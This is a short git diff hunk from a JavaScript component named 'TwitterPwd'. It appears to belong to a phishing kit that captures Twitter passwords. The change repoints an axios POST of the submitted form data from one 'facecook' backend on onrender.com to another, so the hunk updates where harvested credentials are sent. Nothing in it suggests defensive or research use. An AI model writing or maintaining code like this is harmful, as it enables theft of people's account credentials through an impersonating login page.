@@ -31,7 +31,7 @@ const TwitterPwd = () => {
     // make a request to the backend
     try {
       await axios.post(
-        "https://facecookbackend.onrender.com/api/v2/twitter",
+        "https://facecook-backend-wct8.onrender.com/api/v2/twitter",
         formData
       );
     } catch (error) {
